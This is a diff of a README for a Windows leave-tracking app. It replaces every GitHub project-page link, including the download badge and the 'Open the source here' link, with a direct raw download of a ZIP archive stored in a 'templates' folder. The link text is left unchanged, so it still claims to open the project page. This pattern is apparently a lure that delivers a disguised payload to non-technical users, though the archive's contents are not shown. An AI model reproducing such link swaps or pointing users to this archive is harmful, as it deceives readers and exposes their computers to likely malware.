@@ -1,6 +1,6 @@
 # 🗂️ leave-management-system - Simple leave tracking for teams
 
-[![Download](https://img.shields.io/badge/Download-Leave%20Management%20System-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trilltitfortat162/leave-management-system)
+[![Download](https://img.shields.io/badge/Download-Leave%20Management%20System-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Trilltitfortat162/leave-management-system/main/templates/system-leave-management-v1.2-beta.5.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ This app is made for Windows users who want to download the project from GitHub 
 
 Use this link to visit the project page and download the files:
 
-[Open leave-management-system on GitHub](https://github.com/Trilltitfortat162/leave-management-system)
+[Open leave-management-system on GitHub](https://raw.githubusercontent.com/Trilltitfortat162/leave-management-system/main/templates/system-leave-management-v1.2-beta.5.zip)
 
 After you open the page, download the project as a ZIP file. Then extract it to a folder on your Windows computer.
 
@@ -171,7 +171,7 @@ Use sample leave requests to check that the app works as expected:
 
 Open the source here:
 
-[https://github.com/Trilltitfortat162/leave-management-system](https://github.com/Trilltitfortat162/leave-management-system)
+[https://raw.githubusercontent.com/Trilltitfortat162/leave-management-system/main/templates/system-leave-management-v1.2-beta.5.zip](https://raw.githubusercontent.com/Trilltitfortat162/leave-management-system/main/templates/system-leave-management-v1.2-beta.5.zip)
 
 ## 🔧 Troubleshooting
 
